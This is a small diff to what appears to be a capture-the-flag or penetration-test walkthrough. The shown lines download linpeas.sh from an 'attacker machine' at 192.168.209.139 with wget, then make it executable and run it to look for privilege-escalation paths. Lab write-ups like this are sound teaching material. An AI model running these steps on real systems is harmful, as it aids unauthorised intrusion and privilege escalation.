@@ -151,7 +151,7 @@ Download the file from attacker machine :
 wget 192.168.209.139/linpeas.sh
 ```
 
-
+Now give executable permission and execute the file :
 ```
 chmod +x linpeas.sh 
 ./linpeas.sh 
